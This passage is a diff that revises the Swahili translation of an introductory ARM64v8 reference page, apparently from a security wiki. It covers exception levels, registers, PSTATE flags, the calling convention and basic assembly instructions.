@@ -1,229 +1,229 @@
-# Utangulizi kwa ARM64v8
+# Utangulizi wa ARM64v8
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## **Ngazi za Istisnahi - EL (ARM64v8)**
+## **Viwango vya Exceptions - EL (ARM64v8)**
 
-Katika usanifu wa ARMv8, viwango vya utekelezaji vinavyojulikana kama Exception Levels (ELs) vinaelezea kiwango cha ruhusa na uwezo wa mazingira ya utekelezaji. Kuna ngazi nne za isipokuwa, kuanzia EL0 hadi EL3, kila moja ikifanya kazi tofauti:
+Katika architecture ya ARMv8, viwango vya utekelezaji, vinavyojulikana kama Exception Levels (ELs), hufafanua kiwango cha privileges na uwezo wa mazingira ya utekelezaji. Kuna exception levels nne, kuanzia EL0 hadi EL3, na kila kimoja kina madhumuni tofauti:
 
 1. **EL0 - User Mode**:
-- Hii ni ngazi yenye ruhusa ndogo kabisa na hutumika kwa kutekeleza msimbo wa kawaida wa programu.
-- Programu zinazoendesha katika EL0 zimetengwa kutoka kwa kila mmoja na kutoka kwa programu za mfumo, zikiboresha usalama na uthabiti.
+- Hiki ndicho kiwango chenye privileges chache zaidi na hutumika kutekeleza code ya kawaida ya application.
+- Applications zinazoendeshwa katika EL0 zimetengwa kutoka kwa kila mmoja na kutoka kwa system software, hivyo kuimarisha security na stability.
 2. **EL1 - Operating System Kernel Mode**:
-- Mifumo mingi ya kernel ya operating system inaendesha kwa ngazi hii.
-- EL1 ina ruhusa zaidi kuliko EL0 na inaweza kufikia rasilimali za mfumo, lakini kwa vikwazo fulani ili kuhakikisha uadilifu wa mfumo. Unaenda kutoka EL0 hadi EL1 kwa maagizo ya SVC.
+- Kernels nyingi za operating system huendeshwa katika kiwango hiki.
+- EL1 ina privileges zaidi kuliko EL0 na inaweza kufikia system resources, lakini ikiwa na baadhi ya restrictions za kuhakikisha system integrity. Unatoka EL0 kwenda EL1 kwa kutumia instruction ya SVC.
 3. **EL2 - Hypervisor Mode**:
-- Ngazi hii hutumika kwa uandishi wa virtualisation. Hypervisor unaoendesha katika EL2 unaweza kusimamia mifumo mingi ya uendeshaji (kila mmoja katika EL1 yake) ikifanya kazi kwenye vifaa vya kimwili vinavyofanana.
-- EL2 hutoa vipengele vya kutenganisha na kudhibiti mazingira yaliyovirtualishwa.
-- Kwa hivyo programu za mashine za virtual kama Parallels zinaweza kutumia `hypervisor.framework` kuingiliana na EL2 na kuendesha mashine za virtual bila kuhitaji kernel extensions.
-- Kwa kuhamia kutoka EL1 hadi EL2 hutumika maagizo `HVC`.
+- Kiwango hiki hutumika kwa virtualization. Hypervisor inayoendeshwa katika EL2 inaweza kusimamia operating systems nyingi (kila moja ikiwa katika EL1 yake) zinazoendeshwa kwenye hardware ileile ya kimwili.
+- EL2 hutoa features za kutenga na kudhibiti virtualized environments.
+- Kwa hiyo, virtual machine applications kama Parallels zinaweza kutumia `hypervisor.framework` kuwasiliana na EL2 na kuendesha virtual machines bila kuhitaji kernel extensions.
+- Ili kutoka EL1 kwenda EL2, instruction ya `HVC` hutumika.
 4. **EL3 - Secure Monitor Mode**:
-- Hii ni ngazi yenye ruhusa zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
-- EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali za secure na non-secure (k.m. secure boot, trusted OS, n.k.).
-- Ilitumika kwa KPP (Kernel Patch Protection) katika macOS, lakini haijatumika tena.
-- EL3 haisitumiki tena na Apple.
-- Uhamisho kwenda EL3 kwa kawaida hufanyika kwa kutumia maagizo `SMC` (Secure Monitor Call).
+- Hiki ndicho kiwango chenye privileges nyingi zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
+- EL3 inaweza kusimamia na kudhibiti access kati ya secure na non-secure states (kama secure boot, trusted OS, n.k.).
+- Kilitumika kwa KPP (Kernel Patch Protection) katika macOS, lakini hakitumiki tena.
+- EL3 haitumiki tena na Apple.
+- Mpito kwenda EL3 kwa kawaida hufanywa kwa kutumia instruction ya `SMC` (Secure Monitor Call).
 
-Matumizi ya ngazi hizi yanaruhusu njia iliyo na muundo na salama ya kusimamia nyanja tofauti za mfumo, kutoka kwa programu za mtumiaji hadi programu za mfumo zenye ruhusa zaidi. Mbinu ya ARMv8 kwa viwango vya ruhusa husaidia kutenganisha kwa ufanisi vipengele tofauti vya mfumo, hivyo kuboresha usalama na uimara wa mfumo.
+Matumizi ya viwango hivi huwezesha njia iliyopangwa na salama ya kusimamia vipengele tofauti vya system, kuanzia user applications hadi system software yenye privileges nyingi zaidi. Mbinu ya ARMv8 ya kutumia privilege levels husaidia kutenga kwa ufanisi vipengele tofauti vya system, na hivyo kuimarisha security na robustness ya system.
 
-## **Rejista (ARM64v8)**
+## **Registers (ARM64v8)**
 
-ARM64 ina **rejista 31 za madhumuni ya jumla**, zilizoandikwa `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (byte 8). Kwa operesheni zinazohitaji thamani za 32-bit pekee, rejista zile zile zinaweza kufikiwa katika hali ya 32-bit kutumia majina `w0` hadi `w30`.
+ARM64 ina **general-purpose registers 31**, zilizopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **bits 64** (bytes 8). Kwa operations zinazohitaji thamani za bits 32 pekee, registers hizo zinaweza kufikiwa katika mode ya bits 32 kwa kutumia majina w0 hadi w30.
 
-1. **`x0`** hadi **`x7`** - Hizi kwa kawaida hutumika kama rejista za muda (scratch) na kwa kupitisha vigezo kwa subroutines.
-- **`x0`** pia hubeba data ya kurudi ya function
-2. **`x8`** - Katika kernel ya Linux, `x8` hutumika kama nambari ya system call kwa ajili ya maagizo ya `svc`. **Katika macOS x16 ndiye anayetumika!**
-3. **`x9`** hadi **`x15`** - Rejista zaidi za muda, mara nyingi zikitumika kwa vigezo vya ndani (local variables).
-4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Rejista za muda kwa thamani za papo hapo. Zinatumika pia kwa miito isiyo ya moja kwa moja ya function na PLT (Procedure Linkage Table) stubs.
-- **`x16`** hutumika kama **nambari ya system call** kwa maagizo ya **`svc`** katika **macOS**.
-5. **`x18`** - **Platform register**. Inaweza kutumika kama rejista ya madhumuni ya jumla, lakini kwenye baadhi ya majukwaa, rejista hii imehifadhiwa kwa matumizi maalum ya jukwaa: Pointer kwa current thread environment block katika Windows, au kuonyesha structure ya task inayotekelezwa sasa katika kernel ya Linux.
-6. **`x19`** hadi **`x28`** - Hizi ni rejista zinazohifadhiwa na callee. Function lazima ihifadhi thamani za rejista hizi kwa caller wake, hivyo zinahifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
-7. **`x29`** - **Frame pointer** ili kufuatilia fremu ya stack. Wakati fremu mpya ya stack inaundwa kwa sababu function inaitwa, rejista **`x29`** inahifadhiwa kwenye stack na anwani ya fremu **mpya** (anwani ya **`sp`**) inawekwa katika rejista hii.
-- Rejista hii pia inaweza kutumika kama **rejista ya madhumuni ya jumla** ingawa kwa kawaida hutumika kama rejeleo kwa **vigezo vya ndani**.
-8. **`x30`** au **`lr`** - **Link register**. Inabeba **anwani ya kurudi** wakati maagizo `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yatekelezwa kwa kuhifadhi thamani ya **`pc`** katika rejista hii.
-- Inaweza pia kutumika kama rejista nyingine yoyote.
-- Ikiwa function ya sasa itaita function mpya na hivyo kuandika juu `lr`, itahifadhi `lr` kwenye stack mwanzoni, hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya) na kuirejesha mwishoni, hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na rudi).
-9. **`sp`** - **Stack pointer**, inatumika kufuatilia kilele cha stack.
-- thamani ya **`sp`** inapaswa kuhifadhiwa ikiwa ni angalau **quadword** kwa **alignment** au kosa la alignment linaweza kutokea.
-10. **`pc`** - **Program counter**, ambayo inaonyesha kuelekea maagizo yanayofuata. Rejista hii inaweza kusasishwa tu kupitia uzalishaji wa exceptions, kurudi kwa exception, na branches. Maagizo ya kawaida pekee yanayoweza kusoma rejista hii ni branch with link instructions (BL, BLR) ili kuhifadhi anwani ya **`pc`** katika **`lr`** (Link Register).
-11. **`xzr`** - **Zero register**. Pia inaitwa **`wzr`** katika fomu yake ya rejista ya **32**-bit. Inaweza kutumika kupata thamani sifuri kwa urahisi (operesheni ya kawaida) au kufanya comparisons kwa kutumia **`subs`** kama **`subs XZR, Xn, #10`** bila kuhifadhi data iliyopatikana (katika **`xzr`**).
+1. **`x0`** hadi **`x7`** - Kwa kawaida hutumika kama scratch registers na kupitisha parameters kwa subroutines.
+- **`x0`** pia hubeba data ya return ya function
+2. **`x8`** - Katika Linux kernel, `x8` hutumika kama system call number kwa instruction ya `svc`. **Katika macOS, x16 ndiyo inayotumika!**
+3. **`x9`** hadi **`x15`** - Temporary registers zaidi, ambazo mara nyingi hutumika kwa local variables.
+4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Temporary registers za immediate values. Pia hutumika kwa indirect function calls na PLT (Procedure Linkage Table) stubs.
+- **`x16`** hutumika kama **system call number** kwa instruction ya **`svc`** katika **macOS**.
+5. **`x18`** - **Platform register**. Inaweza kutumika kama general-purpose register, lakini kwenye baadhi ya platforms register hii imehifadhiwa kwa matumizi maalum ya platform: Pointer ya current thread environment block katika Windows, au kuonyesha **executing task structure katika Linux kernel**.
+6. **`x19`** hadi **`x28`** - Hizi ni callee-saved registers. Function lazima ihifadhi values za registers hizi kwa ajili ya caller wake, kwa hiyo huhifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
+7. **`x29`** - **Frame pointer** ya kufuatilia stack frame. Stack frame mpya inapoundwa kwa sababu function imeitwa, register ya **`x29`** **huhifadhiwa kwenye stack**, na address ya **new** frame pointer (address ya **`sp`**) **huhifadhiwa katika register hii**.
+- Register hii pia inaweza kutumika kama **general-purpose register**, ingawa kwa kawaida hutumika kama reference ya **local variables**.
+8. **`x30`** au **`lr`**- **Link register**. Huhifadhi **return address** wakati instruction ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) inatekelezwa kwa kuhifadhi thamani ya **`pc`** katika register hii.
+- Inaweza pia kutumika kama register nyingine yoyote.
+- Ikiwa current function itaita function mpya na hivyo ku-overwrite `lr`, itaihifadhi kwenye stack mwanzoni; hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na upate `fp` mpya), na kuirejesha mwishoni; hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na urudi).
+9. **`sp`** - **Stack pointer**, hutumika kufuatilia sehemu ya juu ya stack.
+- Thamani ya **`sp`** inapaswa kuhifadhiwa ikiwa na **alignment** ya angalau **quadword**, vinginevyo alignment exception inaweza kutokea.
+10. **`pc`** - **Program counter**, inayoonyesha instruction inayofuata. Register hii inaweza kusasishwa tu kupitia exception generations, exception returns na branches. Instructions za kawaida pekee zinazoweza kusoma register hii ni branch with link instructions (BL, BLR), kwa ajili ya kuhifadhi address ya **`pc`** katika **`lr`** (Link Register).
+11. **`xzr`** - **Zero register**. Pia huitwa **`wzr`** katika aina yake ya register ya bits **32**. Inaweza kutumika kupata thamani ya zero kwa urahisi (operation ya kawaida), au kufanya comparisons kwa kutumia **`subs`**, kama **`subs XZR, Xn, #10`**, huku data ya matokeo isihifadhiwe popote (katika **`xzr`**).
 
-Rejista za **`Wn`** ni toleo la **32bit** la rejista za **`Xn`**.
+Registers za **`Wn`** ni toleo la **bits 32** la register ya **`Xn`**.
 
 > [!TIP]
-> Rejista kutoka X0 - X18 ni volatile, ambayo inamaanisha thamani zao zinaweza kubadilishwa kwa miito ya function na interrupts. Hata hivyo, rejista kutoka X19 - X28 ni non-volatile, yaani thamani zao lazima zihifadhiwe kuvuka miito ya function ("callee saved").
+> Registers kutoka X0 - X18 ni volatile, kumaanisha kwamba values zake zinaweza kubadilishwa na function calls na interrupts. Hata hivyo, registers kutoka X19 - X28 ni non-volatile, kumaanisha kwamba values zake lazima zihifadhiwe wakati wa function calls ("callee saved").
 
-### Rejista za SIMD na Floating-Point
+### SIMD na Floating-Point Registers
 
-Zaidi yake, kuna rejista nyingine **32 za urefu 128bit** ambazo zinaweza kutumika katika operesheni zilizoboreshwa za single instruction multiple data (SIMD) na kwa kufanya arithmetic ya floating-point. Hizi zinaitwa rejista Vn ingawa zinaweza pia kufanya kazi kwa **64**-bit, **32**-bit, **16**-bit na **8**-bit na wakati huo zinaitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.
+Zaidi ya hayo, kuna **registers 32 nyingine zenye urefu wa bits 128** zinazoweza kutumika katika optimized single instruction multiple data (SIMD) operations na kufanya floating-point arithmetic. Hizi huitwa Vn registers, ingawa zinaweza pia kufanya operations za bits **64**, **32**, **16** na **8**, ambapo huitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.
 
-### Rejista za Mfumo
+### System Registers
 
-**Kuna mamia ya rejista za mfumo**, pia zinazoitwa special-purpose registers (SPRs), zinazotumika kwa **kuangalia** na **kudhibiti** tabia za **processors**.\
-Zinaweza kusomwa au kuwekwa tu kwa kutumia maagizo maalum **`mrs`** na **`msr`**.
+**Kuna system registers mamia**, ambazo pia huitwa special-purpose registers (SPRs), na hutumika kwa **monitoring** na **controlling** tabia ya **processors**.\
+Zinaweza kusomwa au kuwekwa tu kwa kutumia special instructions maalum **`mrs`** na **`msr`**.
 
-Rejista maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa reversing engineering. Kiambishi `EL0` kinaonyesha isipokuwa ya chini zaidi kutoka ambayo rejista inaweza kupatikana (kesi hii EL0 ni ngazi ya kawaida ya isipokuwa ambapo programu za kawaida zinaendesha).\
-Mara nyingi hutumika kuhifadhi **anwani ya msingi ya thread-local storage** sehemu ya kumbukumbu. Kwa kawaida kwanza inaweza kusomwa na kuandikwa kwa programu zinazoendesha katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).
+Special registers **`TPIDR_EL0`** na **`TPIDDR_EL0`** hupatikana mara kwa mara wakati wa reverse engineering. Suffix ya `EL0` inaonyesha **minimal exception** level ambayo register inaweza kufikiwa (katika hali hii EL0 ndiyo exception (privilege) level ya kawaida ambayo regular programs huendeshwa nayo).\
+Mara nyingi hutumika kuhifadhi **base address ya thread-local storage** memory region. Kwa kawaida ya kwanza inaweza kusomwa na kuandikwa na programs zinazoendeshwa katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).
 
-- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
-- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
+- `mrs x0, TPIDR_EL0 ; Soma TPIDR_EL0 ndani ya x0`
+- `msr TPIDR_EL0, X0 ; Andika x0 ndani ya TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** ina vipengele kadhaa vya mchakato vilivyosanifishwa ndani ya rejista maalum inayoonekana kwa operating-system **`SPSR_ELx`**, ambapo X ni **ngazi ya ruhusa** ya isipokuwa iliyochochewa (hii inaruhusu kurejesha hali ya mchakato wakati isipokuwa inapomalizika).\
-Hivi ni sehemu zinazopatikana:
+**PSTATE** ina process components kadhaa zilizowekwa pamoja katika special register **`SPSR_ELx`** inayoonekana kwa operating system, ambapo X ni **permission** **level ya exception iliyo-triggeriwa** (hii huwezesha kurejesha process state exception inapoisha).\
+Hizi ndizo fields zinazoweza kufikiwa:
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- Bendera za hali za masharti **`N`**, **`Z`**, **`C`** na **`V`**:
-- **`N`** ina maana operesheni ilizalisha matokeo hasi
-- **`Z`** ina maana operesheni ilizalisha sifuri
-- **`C`** ina maana operesheni ilibeba (carry)
-- **`V`** ina maana operesheni ilizalisha overflow ya signed:
-- Jumla ya nambari mbili chanya inaweza kuleta matokeo hasi.
-- Jumla ya nambari mbili hasi inaweza kuleta matokeo chanya.
-- Katika utofauti, wakati nambari hasi kubwa inatolewa kutoka kwa nambari chanya ndogo (au kinyume), na matokeo hayawezi kuwakilishwa ndani ya wigo wa ukubwa wa bit uliotolewa.
-- Bila shaka processor hajui ikiwa operesheni ni signed au la, hivyo itachek agu C na V katika operesheni na kuonyesha kama carry ilitokea kwa kesi ya kuwa ilikuwa signed au unsigned.
+- Condition flags **`N`**, **`Z`**, **`C`** na **`V`**:
+- **`N`** inamaanisha operation ilitoa matokeo hasi
+- **`Z`** inamaanisha operation ilitoa zero
+- **`C`** inamaanisha operation ilitoa carry
+- **`V`** inamaanisha operation ilitoa signed overflow:
+- Jumla ya numbers mbili chanya hutoa matokeo hasi.
+- Jumla ya numbers mbili hasi hutoa matokeo chanya.
+- Katika subtraction, wakati large negative number inapotolewa kutoka kwa smaller positive number (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya range ya bit size iliyotolewa.
+- Ni wazi kwamba processor haijui ikiwa operation ni signed au la, kwa hiyo hukagua C na V katika operations na kuonyesha ikiwa carry ilitokea katika hali ya signed au unsigned.
 
 > [!WARNING]
-> Si maagizo yote yanasasisha bendera hizi. Baadhi kama **`CMP`** au **`TST`** yanafanya hivyo, na mengine yenye kirai s kama **`ADDS`** pia hufanya.
+> Si instructions zote husasisha flags hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na nyingine zenye suffix ya s kama **`ADDS`** pia hufanya hivyo.
 
-- Bendera ya **upana wa rejista (`nRW`)**: Ikiwa bendera ina thamani 0, programu itaendesha katika hali ya utekelezaji ya AArch64 mara inaporejeshwa.
-- Ngazi ya sasa ya **Exception (`EL`)**: Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
-- Bendera ya **single stepping (`SS`)**: Inatumika na debuggers kwa kufanya single step kwa kuweka bendera SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia isipokuwa. Programu itaendesha hatua moja na kutoa isipokuwa ya single step.
-- Bendera ya **illegal exception (`IL`)**: Inatumika kuashiria wakati software yenye ruhusa inafanya uhamisho usio halali wa ngazi ya isipokuwa, bendera hii imewekwa 1 na processor itatoa isipokuwa ya illegal state.
-- Bendera za **`DAIF`**: Bendera hizi zinamruhusu programu yenye ruhusa kuchuja kwa uchaguzi isipokuwa fulani za nje.
-- Ikiwa **`A`** ni 1 ina maana **asynchronous aborts** zitaletwa. **`I`** huweka jinsi ya kujibu Requests za Interrupts za Hardware za nje (IRQs). na F inahusiana na **Fast Interrupt Requests** (FIRs).
-- Bendera za **kuchagua stack pointer (`SPS`)**: Programu zenye ruhusa zinazoendesha katika EL1 na juu zinaweza kubadilisha kati ya kutumia rejista yao ya stack pointer na ya mtindo wa mtumiaji (k.m. kati ya `SP_EL1` na `EL0`). Mbadala hii inafanywa kwa kuandika kwenye rejista maalum ya **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.
+- Current **register width (`nRW`) flag**: Ikiwa flag ina thamani 0, program itaendeshwa katika AArch64 execution state itakaporejeshwa.
+- Current **Exception Level** (**`EL`**): Regular program inayoendeshwa katika EL0 itakuwa na thamani 0
+- **Single stepping** flag (**`SS`**): Hutumiwa na debuggers kufanya single step kwa kuweka SS flag kuwa 1 ndani ya **`SPSR_ELx`** kupitia exception. Program itaendesha step moja na kutoa single step exception.
+- **Illegal exception** state flag (**`IL`**): Hutumika kuashiria wakati privileged software inapofanya invalid exception level transfer; flag hii huwekwa kuwa 1 na processor hu-trigger illegal state exception.
+- **`DAIF`** flags: Flags hizi huruhusu privileged program ku-mask kwa kuchagua external exceptions fulani.
+- Ikiwa **`A`** ni 1, inamaanisha **asynchronous aborts** zita-triggeriwa. **`I`** husanidi response kwa hardware ya nje **Interrupts Requests** (IRQs), na F inahusiana na **Fast Interrupt Requests** (FIRs).
+- **Stack pointer select** flags (**`SPS`**): Privileged programs zinazoendeshwa katika EL1 na zaidi zinaweza kubadilisha kati ya kutumia stack pointer register yao na ile ya user model (kwa mfano, kati ya `SP_EL1` na `EL0`). Switching hii hufanywa kwa kuandika kwenye special register ya **`SPSel`**. Hili haliwezi kufanywa kutoka EL0.
 
 ## **Calling Convention (ARM64v8)**
 
-Convention ya miito ya ARM64 inaelekeza kwamba **vigezo nane vya kwanza** kwa function hupitishwa kwenye rejista **`x0` hadi `x7`**. Vigezo **za ziada** hupitishwa kwenye **stack**. Thamani ya **kurudi** inarejeshwa katika rejista **`x0`**, au pia katika **`x1`** ikiwa ni **128 bits** ndefu. Rejista **`x19`** hadi **`x30`** na **`sp`** zinapaswa **kuhifadhiwa** kuvuka miito ya function.
+ARM64 calling convention hubainisha kwamba **parameters nane za kwanza** za function hupitishwa katika registers **`x0`** hadi **`x7`**. Parameters **za ziada** hupitishwa kwenye **stack**. Thamani ya **return** hupitishwa kwenye register **`x0`**, au pia kwenye **`x1`** **ikiwa ina urefu wa bits 128**. Registers **`x19`** hadi **`x30`** na **`sp`** lazima **zihifadhiwe** wakati wa function calls.
 
-Wakati unasoma function katika assembly, tazama **prologue na epilogue** ya function. **Prologue** kwa kawaida inahusisha **kuhifadhi frame pointer (`x29`)**, **kuweka** frame pointer **mpya**, na **kutenga nafasi kwenye stack**. **Epilogue** kwa kawaida inahusisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka function.
+Unaposoma function katika assembly, tafuta **function prologue na epilogue**. **Prologue** kwa kawaida huhusisha **kuhifadhi frame pointer (`x29`)**, **kuweka** **frame pointer mpya**, na **kutenga nafasi kwenye stack**. **Epilogue** kwa kawaida huhusisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka kwenye function.
 
 ### Calling Convention katika Swift
 
-Swift ina **calling convention** yake ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swift ina **calling convention** yake, ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
-## **Maagizo ya Kawaida (ARM64v8)**
+## **Common Instructions (ARM64v8)**
 
-Maagizo ya ARM64 kwa ujumla yana muundo wa **`opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni rejista ya **destination** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni rejista za **source**. Thamani za mara moja (immediate) pia zinaweza kutumika badala ya rejista za source.
+ARM64 instructions kwa ujumla huwa na **format `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operation** itakayofanywa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni register ya **destination** ambako matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni registers za **source**. Immediate values pia zinaweza kutumika badala ya source registers.
 
-- **`mov`**: **Hamisha** thamani kutoka rejista moja kwenda nyingine.
-- Mfano: `mov x0, x1` — Hii inahamisha thamani kutoka `x1` kwenda `x0`.
-- **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** kwa **rejista**.
-- Mfano: `ldr x0, [x1]` — Hii inapakia thamani kutoka eneo la kumbukumbu linaloelekezwa na `x1` ndani ya `x0`.
-- **Offset mode**: Offset inayoathiri pointer ya asili inaonyeshwa, kwa mfano:
-- `ldr x2, [x1, #8]`, hii itapakia kwenye x2 thamani kutoka x1 + 8
-- `ldr x2, [x0, x1, lsl #2]`, hii itapakia kwenye x2 kitu kutoka kwenye array x0, kutoka nafasi x1 (index) * 4
-- **Pre-indexed mode**: Hii itafanya hesabu kwenye chanzo, ipate matokeo na pia kuhifadhi chanzo kipya.
-- `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
-- `str lr, [sp, #-4]!`, Hifadhi link register kwenye sp na sasisha rejista sp
-- **Post-index mode**: Hii ni kama ile ya awali lakini anwani ya kumbukumbu inapatikana kwanza kisha offset inahesabiwa na kuhifadhiwa.
-- `ldr x0, [x1], #8`, pakua `x1` ndani ya `x0` na sasisha x1 kwa `x1 + 8`
-- **PC-relative addressing**: Katika kesi hii anwani ya kupakia inahesabiwa kuhusiana na rejista ya PC
-- `ldr x1, =_start`, Hii itapakia anwani ambapo alama `_start` inaanza ndani ya x1 kuhusiana na PC ya sasa.
-- **`str`**: **Hifadhi** thamani kutoka **rejista** kwenda **kumbukumbu**.
-- Mfano: `str x0, [x1]` — Hii inahifadhi thamani ya `x0` kwenye eneo la kumbukumbu linaloelekezwa na `x1`.
-- **`ldp`**: **Load Pair of Registers**. Amri hii **inapakia rejista mbili** kutoka **mikoa ya kumbukumbu mfululizo**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
-- Mfano: `ldp x0, x1, [x2]` — Hii inapakia `x0` na `x1` kutoka kwenye maeneo ya kumbukumbu katika `x2` na `x2 + 8`, mtawaliwa.
-- **`stp`**: **Store Pair of Registers**. Amri hii **inahifadhi rejista mbili** kwa **mikoa ya kumbukumbu mfululizo**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
-- Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu `sp` na `sp + 8`, mtawaliwa.
-- `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu `sp+16` na `sp + 24`, mtawaliwa, na inasasisha `sp` kwa `sp+16`.
-- **`add`**: **Ongeza** thamani za rejista mbili na hifadhi matokeo katika rejista.
-- Sintaksia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
+- **`mov`**: **Hamisha** value kutoka **register** moja kwenda nyingine.
+- Mfano: `mov x0, x1` — Hii huhamisha value kutoka `x1` kwenda `x0`.
+- **`ldr`**: **Load** value kutoka **memory** kwenda kwenye **register**.
+- Mfano: `ldr x0, [x1]` — Hii hu-load value kutoka memory location inayoonyeshwa na `x1` kwenda `x0`.
+- **Offset mode**: Offset inayoathiri origin pointer huonyeshwa, kwa mfano:
+- `ldr x2, [x1, #8]`, hii hu-load katika x2 value kutoka x1 + 8
+- `ldr x2, [x0, x1, lsl #2]`, hii hu-load katika x2 object kutoka array ya x0, kwenye position x1 (index) \* 4
+- **Pre-indexed mode**: Hii hutumia calculations kwenye origin, hupata matokeo na pia huhifadhi origin mpya katika origin.
+- `ldr x2, [x1, #8]!`, hii hu-load `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
+- `str lr, [sp, #-4]!`, Hifadhi link register katika sp na usasishe register sp
+- **Post-index mode**: Hii ni kama ya awali, lakini memory address hufikiwa kwanza, kisha offset hukokotolewa na kuhifadhiwa.
+- `ldr x0, [x1], #8`, hu-load `x1` katika `x0` na kusasisha x1 kwa `x1 + 8`
+- **PC-relative addressing**: Katika hali hii address ya ku-load hukokotolewa relative kwa PC register
+- `ldr x1, =_start`, Hii hu-load address ambako symbol ya `_start` huanzia katika x1, relative na PC ya sasa.
+- **`str`**: **Store** value kutoka **register** kwenda **memory**.
+- Mfano: `str x0, [x1]` — Hii huhifadhi value iliyo katika `x0` kwenye memory location inayoonyeshwa na `x1`.
+- **`ldp`**: **Load Pair of Registers**. Instruction hii **hu-load registers mbili** kutoka **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value ya register nyingine.
+- Mfano: `ldp x0, x1, [x2]` — Hii hu-load `x0` na `x1` kutoka memory locations zilizo katika `x2` na `x2 + 8`, mtawalia.
+- **`stp`**: **Store Pair of Registers**. Instruction hii **huhifadhi registers mbili** kwenye **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value ya register nyingine.
+- Mfano: `stp x0, x1, [sp]` — Hii huhifadhi `x0` na `x1` kwenye memory locations zilizo katika `sp` na `sp + 8`, mtawalia.
+- `stp x0, x1, [sp, #16]!` — Hii huhifadhi `x0` na `x1` kwenye memory locations zilizo katika `sp+16` na `sp + 24`, mtawalia, na kusasisha `sp` kwa `sp+16`.
+- **`add`**: **Jumlisha** values za registers mbili na uhifadhi matokeo katika register.
+- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 - Xn1 -> Destination
 - Xn2 -> Operand 1
-- Xn3 | #imm -> Operand 2 (rejista au immediate)
-- \[shift #N | RRX] -> Fanya shift au tumia RRX
-- Mfano: `add x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
-- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 ikipandishwa mara 12) -> 1 0000 0000 0000 0000
-- **`adds`** Hii hufanya `add` na kusasisha bendera
-- **`sub`**: **Toa** thamani za rejista mbili na hifadhi matokeo katika rejista.
-- Angalia **sintaksia ya `add`**.
-- Mfano: `sub x0, x1, x2` — Hii inatoa thamani ya `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
-- **`subs`** Hii ni kama sub lakini ikisasisha bendera
-- **`mul`**: **Zidisha** thamani za **rejista mbili** na hifadhi matokeo katika rejista.
-- Mfano: `mul x0, x1, x2` — Hii inazidisha thamani za `x1` na `x2` na kuhifadhi matokeo katika `x0`.
-- **`div`**: **Gawa** thamani ya rejista moja kwa nyingine na hifadhi matokeo katika rejista.
